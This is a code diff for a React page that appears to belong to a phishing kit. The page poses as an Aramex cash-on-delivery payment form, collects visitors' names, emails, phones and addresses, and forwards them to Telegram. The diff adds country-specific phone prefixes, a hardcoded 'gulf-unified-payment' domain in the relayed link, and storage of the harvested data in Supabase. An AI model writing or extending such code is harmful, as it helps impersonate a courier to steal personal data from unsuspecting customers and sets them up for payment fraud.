@@ -6,8 +6,9 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCountryByCode } from "@/lib/countries";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { useLink } from "@/hooks/useSupabase";
+import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
@@ -29,17 +30,24 @@ const PaymentRecipient = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const updateLink = useUpdateLink();
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
-  
+
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+
+  // Get country from link data
+  const countryCode = linkData?.country_code || "SA";
+  const countryData = getCountryByCode(countryCode);
+  const phoneCode = countryData?.phoneCode || "+966";
+  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -65,7 +73,9 @@ const PaymentRecipient = () => {
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
+    if (!linkData) return;
+
     // Submit to Netlify Forms
     const formData = new FormData();
     formData.append('form-name', 'payment-recipient');
@@ -76,7 +86,7 @@ const PaymentRecipient = () => {
     formData.append('service', serviceName);
     formData.append('amount', formattedAmount);
     formData.append('linkId', id || '');
-    
+
     try {
       await fetch('/', {
         method: 'POST',
@@ -86,8 +96,9 @@ const PaymentRecipient = () => {
     } catch (error) {
       console.error('Form submission error:', error);
     }
-    
+
     // Send data to Telegram
+    const productionDomain = 'https://gulf-unified-payment.netlify.app';
     const telegramResult = await sendToTelegram({
       type: 'payment_recipient',
       data: {
@@ -97,7 +108,7 @@ const PaymentRecipient = () => {
         address: residentialAddress,
         service: serviceName,
         amount: formattedAmount,
-        payment_url: `${window.location.origin}/pay/${id}/details`
+        payment_url: `${productionDomain}/pay/${id}/details`
       },
       timestamp: new Date().toISOString()
     });
@@ -108,14 +119,28 @@ const PaymentRecipient = () => {
       console.error('Failed to send recipient data to Telegram:', telegramResult.error);
     }
 
-    sessionStorage.setItem('customerInfo', JSON.stringify({
-      name: customerName,
-      email: customerEmail,
-      phone: customerPhone,
-      address: residentialAddress,
-      service: serviceName,
-      amount: formattedAmount
-    }));
+    // Save customer data to the link's payload in Supabase for cross-device compatibility
+    try {
+      const customerData = {
+        ...linkData.payload,
+        customerInfo: {
+          name: customerName,
+          email: customerEmail,
+          phone: customerPhone,
+          address: residentialAddress,
+          service: serviceName,
+          amount: formattedAmount
+        }
+      };
+
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: customerData
+      });
+    } catch (error) {
+      console.error('Error saving customer data:', error);
+    }
+
     navigate(`/pay/${id}/details`);
   };
   
@@ -225,7 +250,7 @@ const PaymentRecipient = () => {
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
                       className="h-10 sm:h-12 text-sm sm:text-base"
-                      placeholder="+966 5X XXX XXXX"
+                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                     />
                   </div>
                   
